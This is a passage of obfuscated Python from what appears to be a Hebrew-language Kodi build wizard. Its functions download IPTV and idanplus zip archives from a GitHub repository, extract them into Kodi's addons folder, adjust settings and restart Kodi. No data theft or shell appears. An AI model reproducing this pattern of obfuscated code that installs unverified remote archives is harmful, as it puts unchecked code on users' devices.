                      OO00O00OOOO0OO0OO =OO00O00OOOO0OO0OO /1024 #line:5654
                    else :#line:5655
                     OO00O00OOOO0OO0OO =0 #line:5656
                    OO00OO0O0O0OOO00O ='KB'#line:5657
                    if OO00O00OOOO0OO0OO >=1024 :#line:5658
                       OO00O00OOOO0OO0OO =OO00O00OOOO0OO0OO /1024 #line:5659
                       OO00OO0O0O0OOO00O ='MB'#line:5660
                    if OO00O00OOOO0OO0OO >0 and not O00OOO00O0OO00000 ==100 :#line:5661
                        OOOO0O00O00O0O000 =(OOOO00O000000000O -O0O0OOOOOOO0OOO00 )/OO00O00OOOO0OO0OO #line:5662
                    else :#line:5663
                        OOOO0O00O00O0O000 =0 #line:5664
                    OO0OO0O0OO00000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00O00OOOO0OO0OO ,OO00OO0O0O0OOO00O )#line:5665
                    OO0O0O000OOO0O0O0 .update (int (O00OOO00O0OO00000 ),"Downloading "+'iptv',OOOO000000OO0O000 ,OO0OO0O0OO00000O0 )#line:5667
              OO0O0OO000O00OO0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5670
              O0O0OOOOO00O0000O .close ()#line:5673
              extract .all (OOO00OO0O0O0O0OO0 ,OO0O0OO000O00OO0O ,OO0O0O000OOO0O0O0 )#line:5674
              try :#line:5675
                os .remove (OOO00OO0O0O0O0OO0 )#line:5676
              except :#line:5678
                pass #line:5679
              OO0O0O000OOO0O0O0 .close ()#line:5680
def iptvkodi17_18 ():#line:5681
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:5684
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5685
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5686
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5690
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:5691
              OOOOOOO000O0OOO00 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5693
              O00O00OOOO0O0OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5694
              O0OOOOO000O0O0000 =xbmcgui .DialogProgress ()#line:5695
              O0OOOOO000O0O0000 .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:5696
              OOOOO00000O000OOO =os .path .join (O00O00OOOO0O0OO00 ,'isr.zip')#line:5697
              O0O0OOO0000O000OO =urllib2 .Request (OOOOOOO000O0OOO00 )#line:5698
              OO0O0O0OO0O000OOO =urllib2 .urlopen (O0O0OOO0000O000OO )#line:5699
              O00O0O0O0OO0O0O00 =xbmcgui .DialogProgress ()#line:5701
              O00O0O0O0OO0O0O00 .create ("Downloading","Downloading "+'iptv')#line:5702
              O00O0O0O0OO0O0O00 .update (0 )#line:5703
              O0O0OO0OOOO0OOOO0 =open (OOOOO00000O000OOO ,'wb')#line:5705
              try :#line:5707
                O0O0000OOO00O0O0O =OO0O0O0OO0O000OOO .info ().getheader ('Content-Length').strip ()#line:5708
                OO00O0O00OO0OOO0O =True #line:5709
              except AttributeError :#line:5710
                    OO00O0O00OO0OOO0O =False #line:5711
              if OO00O0O00OO0OOO0O :#line:5713
                    O0O0000OOO00O0O0O =int (O0O0000OOO00O0O0O )#line:5714
              OOO0OOOO0O000OO0O =0 #line:5716
              OOO0O000OO0O0000O =time .time ()#line:5717
              while True :#line:5718
                    OOO000OOO0000OOO0 =OO0O0O0OO0O000OOO .read (8192 )#line:5719
                    if not OOO000OOO0000OOO0 :#line:5720
                        sys .stdout .write ('\n')#line:5721
                        break #line:5722
                    OOO0OOOO0O000OO0O +=len (OOO000OOO0000OOO0 )#line:5724
                    O0O0OO0OOOO0OOOO0 .write (OOO000OOO0000OOO0 )#line:5725
                    if not OO00O0O00OO0OOO0O :#line:5727
                        O0O0000OOO00O0O0O =OOO0OOOO0O000OO0O #line:5728
                    if O00O0O0O0OO0O0O00 .iscanceled ():#line:5729
                       O00O0O0O0OO0O0O00 .close ()#line:5730
                       try :#line:5731
                        os .remove (OOOOO00000O000OOO )#line:5732
                       except :#line:5733
                        pass #line:5734
                       break #line:5735
                    O000OO0O0O0OO0O0O =float (OOO0OOOO0O000OO0O )/O0O0000OOO00O0O0O #line:5736
                    O000OO0O0O0OO0O0O =round (O000OO0O0O0OO0O0O *100 ,2 )#line:5737
                    O0000O00O00OOO0O0 =OOO0OOOO0O000OO0O /(1024 *1024 )#line:5738
                    O0OOO0OO00OOO0O0O =O0O0000OOO00O0O0O /(1024 *1024 )#line:5739
                    OOO00O0000OO0000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0000O00O00OOO0O0 ,'teal',O0OOO0OO00OOO0O0O )#line:5740
                    if (time .time ()-OOO0O000OO0O0000O )>0 :#line:5741
                      O00O0OO0O00O0O0O0 =OOO0OOOO0O000OO0O /(time .time ()-OOO0O000OO0O0000O )#line:5742
                      O00O0OO0O00O0O0O0 =O00O0OO0O00O0O0O0 /1024 #line:5743
                    else :#line:5744
                     O00O0OO0O00O0O0O0 =0 #line:5745
                    OOOO00O00O000000O ='KB'#line:5746
                    if O00O0OO0O00O0O0O0 >=1024 :#line:5747
                       O00O0OO0O00O0O0O0 =O00O0OO0O00O0O0O0 /1024 #line:5748
                       OOOO00O00O000000O ='MB'#line:5749
                    if O00O0OO0O00O0O0O0 >0 and not O000OO0O0O0OO0O0O ==100 :#line:5750
                        OOO0000O00O0OOO00 =(O0O0000OOO00O0O0O -OOO0OOOO0O000OO0O )/O00O0OO0O00O0O0O0 #line:5751
                    else :#line:5752
                        OOO0000O00O0OOO00 =0 #line:5753
                    OOO0O0OOOO00OOO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O0OO0O00O0O0O0 ,OOOO00O00O000000O )#line:5754
                    O00O0O0O0OO0O0O00 .update (int (O000OO0O0O0OO0O0O ),"Downloading "+'iptv',OOO00O0000OO0000O ,OOO0O0OOOO00OOO0O )#line:5756
              O0O0OOOOOO0000OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5759
              O0O0OO0OOOO0OOOO0 .close ()#line:5762
              extract .all (OOOOO00000O000OOO ,O0O0OOOOOO0000OOO ,O00O0O0O0OO0O0O00 )#line:5763
              wiz .kodi17Fix ()#line:5765
              try :#line:5767
                os .remove (OOOOO00000O000OOO )#line:5768
              except :#line:5770
                pass #line:5771
              O00O0O0O0OO0O0O00 .close ()#line:5772
              xbmc .sleep (5000 )#line:5774
              O0O0OO00O0O0O00O0 ='התקנת לקוח טלוויזיה חיה'#line:5776
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO00O0O0O00O0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5777
              resetkodi ()#line:5778
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5779
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5780
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:5781
              OOOOOOO000O0OOO00 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5782
              O00O00OOOO0O0OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5783
              O0OOOOO000O0O0000 =xbmcgui .DialogProgress ()#line:5784
              O0OOOOO000O0O0000 .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:5785
              OOOOO00000O000OOO =os .path .join (O00O00OOOO0O0OO00 ,'isr.zip')#line:5786
              O0O0OOO0000O000OO =urllib2 .Request (OOOOOOO000O0OOO00 )#line:5787
              OO0O0O0OO0O000OOO =urllib2 .urlopen (O0O0OOO0000O000OO )#line:5788
              O00O0O0O0OO0O0O00 =xbmcgui .DialogProgress ()#line:5790
              O00O0O0O0OO0O0O00 .create ("Downloading","Downloading "+'iptv')#line:5791
              O00O0O0O0OO0O0O00 .update (0 )#line:5792
              O0O0OO0OOOO0OOOO0 =open (OOOOO00000O000OOO ,'wb')#line:5794
              try :#line:5796
                O0O0000OOO00O0O0O =OO0O0O0OO0O000OOO .info ().getheader ('Content-Length').strip ()#line:5797
                OO00O0O00OO0OOO0O =True #line:5798
              except AttributeError :#line:5799
                    OO00O0O00OO0OOO0O =False #line:5800
              if OO00O0O00OO0OOO0O :#line:5802
                    O0O0000OOO00O0O0O =int (O0O0000OOO00O0O0O )#line:5803
              OOO0OOOO0O000OO0O =0 #line:5805
              OOO0O000OO0O0000O =time .time ()#line:5806
              while True :#line:5807
                    OOO000OOO0000OOO0 =OO0O0O0OO0O000OOO .read (8192 )#line:5808
                    if not OOO000OOO0000OOO0 :#line:5809
                        sys .stdout .write ('\n')#line:5810
                        break #line:5811
                    OOO0OOOO0O000OO0O +=len (OOO000OOO0000OOO0 )#line:5813
                    O0O0OO0OOOO0OOOO0 .write (OOO000OOO0000OOO0 )#line:5814
                    if not OO00O0O00OO0OOO0O :#line:5816
                        O0O0000OOO00O0O0O =OOO0OOOO0O000OO0O #line:5817
                    if O00O0O0O0OO0O0O00 .iscanceled ():#line:5818
                       O00O0O0O0OO0O0O00 .close ()#line:5819
                       try :#line:5820
                        os .remove (OOOOO00000O000OOO )#line:5821
                       except :#line:5822
                        pass #line:5823
                       break #line:5824
                    O000OO0O0O0OO0O0O =float (OOO0OOOO0O000OO0O )/O0O0000OOO00O0O0O #line:5825
                    O000OO0O0O0OO0O0O =round (O000OO0O0O0OO0O0O *100 ,2 )#line:5826
                    O0000O00O00OOO0O0 =OOO0OOOO0O000OO0O /(1024 *1024 )#line:5827
                    O0OOO0OO00OOO0O0O =O0O0000OOO00O0O0O /(1024 *1024 )#line:5828
                    OOO00O0000OO0000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0000O00O00OOO0O0 ,'teal',O0OOO0OO00OOO0O0O )#line:5829
                    if (time .time ()-OOO0O000OO0O0000O )>0 :#line:5830
                      O00O0OO0O00O0O0O0 =OOO0OOOO0O000OO0O /(time .time ()-OOO0O000OO0O0000O )#line:5831
                      O00O0OO0O00O0O0O0 =O00O0OO0O00O0O0O0 /1024 #line:5832
                    else :#line:5833
                     O00O0OO0O00O0O0O0 =0 #line:5834
                    OOOO00O00O000000O ='KB'#line:5835
                    if O00O0OO0O00O0O0O0 >=1024 :#line:5836
                       O00O0OO0O00O0O0O0 =O00O0OO0O00O0O0O0 /1024 #line:5837
                       OOOO00O00O000000O ='MB'#line:5838
                    if O00O0OO0O00O0O0O0 >0 and not O000OO0O0O0OO0O0O ==100 :#line:5839
                        OOO0000O00O0OOO00 =(O0O0000OOO00O0O0O -OOO0OOOO0O000OO0O )/O00O0OO0O00O0O0O0 #line:5840
                    else :#line:5841
                        OOO0000O00O0OOO00 =0 #line:5842
                    OOO0O0OOOO00OOO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O0OO0O00O0O0O0 ,OOOO00O00O000000O )#line:5843
                    O00O0O0O0OO0O0O00 .update (int (O000OO0O0O0OO0O0O ),"Downloading "+'iptv',OOO00O0000OO0000O ,OOO0O0OOOO00OOO0O )#line:5845
              O0O0OOOOOO0000OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5848
              O0O0OO0OOOO0OOOO0 .close ()#line:5851
              extract .all (OOOOO00000O000OOO ,O0O0OOOOOO0000OOO ,O00O0O0O0OO0O0O00 )#line:5852
              wiz .kodi17Fix ()#line:5853
              try :#line:5855
                os .remove (OOOOO00000O000OOO )#line:5856
              except :#line:5858
                pass #line:5859
              O00O0O0O0OO0O0O00 .close ()#line:5860
              xbmc .sleep (5000 )#line:5862
              O0O0OO00O0O0O00O0 ='התקנת לקוח טלוויזיה חיה'#line:5864
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO00O0O0O00O0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5865
              resetkodi ()#line:5866
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5868
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:5869
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5870
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5871
def iptvidanplus ():#line:5872
    O00O0O0O00O000OOO =xbmcaddon .Addon ('plugin.video.idanplus')#line:5873
    O00O0O0O00O000OOO .setSetting ('useIPTV','true')#line:5874
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:5875
    if KODIV >=17 and KODIV <18 :#line:5878
        OO00O00OO0OOOO00O ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:5880
        OOOOO00OO0OOOOOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5881
        O000OO00000OO0000 =xbmcgui .DialogProgress ()#line:5882
        O000OO00000OO0000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5883
        OOO0OOOOO00000000 =os .path .join (PACKAGES ,'isr.zip')#line:5884
        OOOO0O0O0000O0OOO =urllib2 .Request (OO00O00OO0OOOO00O )#line:5885
        OOOOO0O0O0OOO0000 =urllib2 .urlopen (OOOO0O0O0000O0OOO )#line:5886
        OOOO00OOO00000000 =xbmcgui .DialogProgress ()#line:5888
        OOOO00OOO00000000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5889
        OOOO00OOO00000000 .update (0 )#line:5890
        OOOOO000OO00OOOO0 =open (OOO0OOOOO00000000 ,'wb')#line:5892
        try :#line:5894
          O000OOO0O000OOOO0 =OOOOO0O0O0OOO0000 .info ().getheader ('Content-Length').strip ()#line:5895
          OO000O0OO0O0OOOOO =True #line:5896
        except AttributeError :#line:5897
              OO000O0OO0O0OOOOO =False #line:5898
        if OO000O0OO0O0OOOOO :#line:5900
              O000OOO0O000OOOO0 =int (O000OOO0O000OOOO0 )#line:5901
        OOOO00O0000OO00OO =0 #line:5903
        OOO00O0OOOO0OO00O =time .time ()#line:5904
        while True :#line:5905
              OOO0O000O000000OO =OOOOO0O0O0OOO0000 .read (8192 )#line:5906
              if not OOO0O000O000000OO :#line:5907
                  sys .stdout .write ('\n')#line:5908
                  break #line:5909
              OOOO00O0000OO00OO +=len (OOO0O000O000000OO )#line:5911
              OOOOO000OO00OOOO0 .write (OOO0O000O000000OO )#line:5912
              if not OO000O0OO0O0OOOOO :#line:5914
                  O000OOO0O000OOOO0 =OOOO00O0000OO00OO #line:5915
              if OOOO00OOO00000000 .iscanceled ():#line:5916
                 OOOO00OOO00000000 .close ()#line:5917
                 try :#line:5918
                  os .remove (OOO0OOOOO00000000 )#line:5919
                 except :#line:5920
                  pass #line:5921
                 break #line:5922
              O0OO00OOO00OOOO00 =float (OOOO00O0000OO00OO )/O000OOO0O000OOOO0 #line:5923
              O0OO00OOO00OOOO00 =round (O0OO00OOO00OOOO00 *100 ,2 )#line:5924
              O0O00OOOOOOO0O000 =OOOO00O0000OO00OO /(1024 *1024 )#line:5925
              O000OO000O0O000O0 =O000OOO0O000OOOO0 /(1024 *1024 )#line:5926
              O000000OO0OO0000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O00OOOOOOO0O000 ,'teal',O000OO000O0O000O0 )#line:5927
              if (time .time ()-OOO00O0OOOO0OO00O )>0 :#line:5928
                O00000O000O0OOO0O =OOOO00O0000OO00OO /(time .time ()-OOO00O0OOOO0OO00O )#line:5929
                O00000O000O0OOO0O =O00000O000O0OOO0O /1024 #line:5930
              else :#line:5931
               O00000O000O0OOO0O =0 #line:5932
              O0O00O0OO0OOOO0OO ='KB'#line:5933
              if O00000O000O0OOO0O >=1024 :#line:5934
                 O00000O000O0OOO0O =O00000O000O0OOO0O /1024 #line:5935
                 O0O00O0OO0OOOO0OO ='MB'#line:5936
              if O00000O000O0OOO0O >0 and not O0OO00OOO00OOOO00 ==100 :#line:5937
                  OOO0000OO00O0OOOO =(O000OOO0O000OOOO0 -OOOO00O0000OO00OO )/O00000O000O0OOO0O #line:5938
              else :#line:5939
                  OOO0000OO00O0OOOO =0 #line:5940
              OOO000O0OOO0000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00000O000O0OOO0O ,O0O00O0OO0OOOO0OO )#line:5941
              OOOO00OOO00000000 .update (int (O0OO00OOO00OOOO00 ),O000000OO0OO0000O ,OOO000O0OOO0000O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5943
        O0O00OOO000O00OO0 =xbmc .translatePath (os .path .join ('special://home/'))#line:5946
        OOOOO000OO00OOOO0 .close ()#line:5949
        extract .all (OOO0OOOOO00000000 ,O0O00OOO000O00OO0 ,OOOO00OOO00000000 )#line:5950
        try :#line:5954
          os .remove (OOO0OOOOO00000000 )#line:5955
        except :#line:5956
          pass #line:5957
        wiz .kodi17Fix ()#line:5958
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5959
        time .sleep (10 )#line:5960
        O0OO000OOO0OO0O00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:5961
        O0OO000OOO0OO0O00 .setSetting ('epgTimeShift','1.000000')#line:5962
        O0OO000OOO0OO0O00 .setSetting ('m3uPathType','0')#line:5963
        O0OO000OOO0OO0O00 .setSetting ('epgPathType','0')#line:5964
        O0OO000OOO0OO0O00 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:5965
        O0OO000OOO0OO0O00 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:5966
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:5967
        resetkodi ()#line:5968
    if KODIV >=18 :#line:5971
        iptvkodi18idan ()#line:5973
        wiz .kodi17Fix ()#line:5974
        time .sleep (10 )#line:5976
        O0OO000OOO0OO0O00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:5977
        O0OO000OOO0OO0O00 .setSetting ('epgTimeShift','1.000000')#line:5978
        O0OO000OOO0OO0O00 .setSetting ('m3uPathType','0')#line:5979
        O0OO000OOO0OO0O00 .setSetting ('epgPathType','0')#line:5980
        O0OO000OOO0OO0O00 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:5981
        O0OO000OOO0OO0O00 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:5982
        O0O0000O00O0O0O00 ='הגדרת ערוצי עידן פלוס'#line:5983
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0000O00O0O0O00 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5984
        resetkodi ()#line:5985
def iptvsimpldown ():#line:6001
    OO0OO00OOOOO00O00 =(IPTV18 )#line:6003
    OO00000OOOO0OO0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6004
    OOO0OOOOO00000O00 =xbmcgui .DialogProgress ()#line:6005
    OOO0OOOOO00000O00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6006
    OO00OOOO0OOO00000 =os .path .join (PACKAGES ,'isr.zip')#line:6007
    OO0O0OO000OOO0O00 =urllib2 .Request (OO0OO00OOOOO00O00 )#line:6008
    O00O000000O000OO0 =urllib2 .urlopen (OO0O0OO000OOO0O00 )#line:6009
    OO000OO00OOO0O00O =xbmcgui .DialogProgress ()#line:6011
    OO000OO00OOO0O00O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6012
    OO000OO00OOO0O00O .update (0 )#line:6013
    OOOO00O0O00O00000 =open (OO00OOOO0OOO00000 ,'wb')#line:6015
    try :#line:6017
      O0OO0O0000OOO0000 =O00O000000O000OO0 .info ().getheader ('Content-Length').strip ()#line:6018
      OOOOOO0O0O0000O0O =True #line:6019
    except AttributeError :#line:6020
          OOOOOO0O0O0000O0O =False #line:6021
    if OOOOOO0O0O0000O0O :#line:6023
          O0OO0O0000OOO0000 =int (O0OO0O0000OOO0000 )#line:6024
    OO000OOOOOO00OO0O =0 #line:6026
    O00O000OO00OO0O00 =time .time ()#line:6027
    while True :#line:6028
          OOOO00000O0O0000O =O00O000000O000OO0 .read (8192 )#line:6029
          if not OOOO00000O0O0000O :#line:6030
              sys .stdout .write ('\n')#line:6031
              break #line:6032
          OO000OOOOOO00OO0O +=len (OOOO00000O0O0000O )#line:6034
          OOOO00O0O00O00000 .write (OOOO00000O0O0000O )#line:6035
          if not OOOOOO0O0O0000O0O :#line:6037
              O0OO0O0000OOO0000 =OO000OOOOOO00OO0O #line:6038
          if OO000OO00OOO0O00O .iscanceled ():#line:6039
             OO000OO00OOO0O00O .close ()#line:6040
             try :#line:6041
              os .remove (OO00OOOO0OOO00000 )#line:6042
             except :#line:6043
              pass #line:6044
             break #line:6045
          OO0OO00O0OO0OO0OO =float (OO000OOOOOO00OO0O )/O0OO0O0000OOO0000 #line:6046
          OO0OO00O0OO0OO0OO =round (OO0OO00O0OO0OO0OO *100 ,2 )#line:6047
          OO0O0OOOOO00000OO =OO000OOOOOO00OO0O /(1024 *1024 )#line:6048
          O00O0OOOOO00000O0 =O0OO0O0000OOO0000 /(1024 *1024 )#line:6049
          OOOOO0OO000O0O0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O0OOOOO00000OO ,'teal',O00O0OOOOO00000O0 )#line:6050
          if (time .time ()-O00O000OO00OO0O00 )>0 :#line:6051
            O0OO0O0OO000O00O0 =OO000OOOOOO00OO0O /(time .time ()-O00O000OO00OO0O00 )#line:6052
            O0OO0O0OO000O00O0 =O0OO0O0OO000O00O0 /1024 #line:6053
          else :#line:6054
           O0OO0O0OO000O00O0 =0 #line:6055
          OOO000O000000OOO0 ='KB'#line:6056
          if O0OO0O0OO000O00O0 >=1024 :#line:6057
             O0OO0O0OO000O00O0 =O0OO0O0OO000O00O0 /1024 #line:6058
             OOO000O000000OOO0 ='MB'#line:6059
          if O0OO0O0OO000O00O0 >0 and not OO0OO00O0OO0OO0OO ==100 :#line:6060
              O0OO00OOO0O0000O0 =(O0OO0O0000OOO0000 -OO000OOOOOO00OO0O )/O0OO0O0OO000O00O0 #line:6061
          else :#line:6062
              O0OO00OOO0O0000O0 =0 #line:6063
          O00OOO00O00000OOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0O0OO000O00O0 ,OOO000O000000OOO0 )#line:6064
          OO000OO00OOO0O00O .update (int (OO0OO00O0OO0OO0OO ),OOOOO0OO000O0O0OO ,O00OOO00O00000OOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6066
    O0O0O0O000O00OO0O =xbmc .translatePath (os .path .join ('special://home/'))#line:6069
    OOOO00O0O00O00000 .close ()#line:6072
    extract .all (OO00OOOO0OOO00000 ,O0O0O0O000O00OO0O ,OO000OO00OOO0O00O )#line:6073
    try :#line:6077
      os .remove (OO00OOOO0OOO00000 )#line:6078
    except :#line:6079
      pass #line:6080
def testnotify ():#line:6081
	O00OOO000OOO00OOO =wiz .workingURL (NOTIFICATION )#line:6082
	if O00OOO000OOO00OOO ==True :#line:6083
		try :#line:6084
			O0O0O000OOOOO0000 ,OO00OO00O00O00OOO =wiz .splitNotify (NOTIFICATION )#line:6085
			if O0O0O000OOOOO0000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6086
			if STARTP2 ()=='ok':#line:6087
				notify .notification (OO00OO00O00O00OOO ,True )#line:6088
		except Exception as O0000OO000000OOO0 :#line:6089
			wiz .log ("Error on Notifications Window: %s"%str (O0000OO000000OOO0 ),xbmc .LOGERROR )#line:6090
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6091
def testnotify2 ():#line:6092
	OO00OOO0000O00000 =wiz .workingURL (NOTIFICATION2 )#line:6093
	if OO00OOO0000O00000 ==True :#line:6094
		try :#line:6095
			O0O0OO0000OOOOO00 ,O0OO00OO00O0000OO =wiz .splitNotify (NOTIFICATION2 )#line:6096
			if O0O0OO0000OOOOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6097
			if STARTP2 ()=='ok':#line:6098
				notify .notification2 (O0OO00OO00O0000OO ,True )#line:6099
		except Exception as O00O00OOO0O00000O :#line:6100
			wiz .log ("Error on Notifications Window: %s"%str (O00O00OOO0O00000O ),xbmc .LOGERROR )#line:6101
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6102
def testnotify3 ():#line:6103
	OO0000000O0O00OOO =wiz .workingURL (NOTIFICATION3 )#line:6104
	if OO0000000O0O00OOO ==True :#line:6105
		try :#line:6106
			O0OOO0OO0OOO0OO00 ,OOOO00OO00O0OO0O0 =wiz .splitNotify (NOTIFICATION3 )#line:6107
			if O0OOO0OO0OOO0OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6108
			if STARTP2 ()=='ok':#line:6109
				notify .notification3 (OOOO00OO00O0OO0O0 ,True )#line:6110
		except Exception as OO0OO000O0O0OO0O0 :#line:6111
			wiz .log ("Error on Notifications Window: %s"%str (OO0OO000O0O0OO0O0 ),xbmc .LOGERROR )#line:6112
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6113
def wait ():#line:6114
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6115
def infobuild ():#line:6116
	O00O00OOO000O0OO0 =wiz .workingURL (NOTIFICATION )#line:6117
	if O00O00OOO000O0OO0 ==True :#line:6118
		try :#line:6119
			O0O0OOO0000O00OO0 ,O0OOO0O0O0OOO0O00 =wiz .splitNotify (NOTIFICATION )#line:6120
			if O0O0OOO0000O00OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6121
			if STARTP2 ()=='ok':#line:6122
				notify .updateinfo (O0OOO0O0O0OOO0O00 ,True )#line:6123
		except Exception as O0O00000O0OOOO00O :#line:6124
			wiz .log ("Error on Notifications Window: %s"%str (O0O00000O0OOOO00O ),xbmc .LOGERROR )#line:6125
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6126
def servicemanual ():#line:6127
	OOO00000OOO0OO0OO =wiz .workingURL (HELPINFO )#line:6128
	if OOO00000OOO0OO0OO ==True :#line:6129
		try :#line:6130
			O0O0O0O0O0O0OOO00 ,O00000O0OO0OOO00O =wiz .splitNotify (HELPINFO )#line:6131
			if O0O0O0O0O0O0OOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6132
			notify .helpinfo (O00000O0OO0OOO00O ,True )#line:6133
		except Exception as OO00O0OO0O00O000O :#line:6134
			wiz .log ("Error on Notifications Window: %s"%str (OO00O0OO0O00O000O ),xbmc .LOGERROR )#line:6135
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6136
def testupdate ():#line:6138
	if BUILDNAME =="":#line:6139
		notify .updateWindow ()#line:6140
	else :#line:6141
